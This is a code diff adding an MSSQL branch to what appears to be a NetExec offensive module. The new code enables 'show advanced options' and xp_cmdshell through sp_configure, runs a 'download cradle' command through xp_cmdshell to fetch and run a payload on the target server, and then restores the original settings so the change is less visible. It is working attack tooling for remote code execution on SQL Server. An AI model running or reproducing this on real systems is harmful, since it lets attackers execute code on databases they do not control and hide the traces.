@@ -1409,6 +1409,56 @@ class NXCModule:
             else:
                 # For certutil/bitsadmin, use regular execute
                 connection.execute(cmd)
+        elif protocol == "mssql":
+            # MSSQL: Execute download cradle via xp_cmdshell
+            
+            # Reject Linux download tools (MSSQL targets Windows only)
+            if self.staging_method in ["wget", "curl", "python"]:
+                context.log.fail(f"Download tool '{self.staging_method}' not supported for MSSQL (Windows-only protocol)")
+                sys.exit(1)
+            
+            # Helper functions for xp_cmdshell state management
+            def query_option_state(option):
+                """Direct SQL query for option state (0/1)."""
+                try:
+                    result = connection.sql_query(f"SELECT value FROM sys.configurations WHERE name='{option}'")
+                    return result[0]['value'] if result else 0
+                except Exception as e:
+                    context.log.warning(f"Failed to query {option} state: {e}")
+                    return 0
+            
+            def set_option(option, enabled):
+                """Direct sp_configure + RECONFIGURE."""
+                try:
+                    sql = f"EXEC sp_configure '{option}', {enabled}; RECONFIGURE;"
+                    connection.conn.sql_query(sql)
+                    context.log.debug(f"{option} set to {enabled}")
+                except Exception as e:
+                    context.log.fail(f"Failed to set {option}={enabled}: {e}")
+                    raise
+            
+            # Backup original xp_cmdshell and advanced options state
+            adv_orig = query_option_state('show advanced options')
+            xp_orig = query_option_state('xp_cmdshell')
+            context.log.debug(f"Original MSSQL options: advanced={adv_orig}, xp_cmdshell={xp_orig}")
+            
+            try:
+                # Enable xp_cmdshell if needed
+                if adv_orig == 0:
+                    set_option('show advanced options', 1)
+                if xp_orig == 0:
+                    set_option('xp_cmdshell', 1)
+                
+                # Execute download cradle via xp_cmdshell
+                connection.execute(cmd)
+                context.log.info(f"Download cradle executed via MSSQL (xp_cmdshell)")
+            finally:
+                # Restore original xp_cmdshell and advanced options state
+                if adv_orig == 0:
+                    set_option('show advanced options', 0)
+                if xp_orig == 0:
+                    set_option('xp_cmdshell', 0)
+                context.log.debug("Restored original MSSQL option states")
         else:
             # For other protocols, use handler's execute method
             handler.execute(context, connection, cmd, os_type)
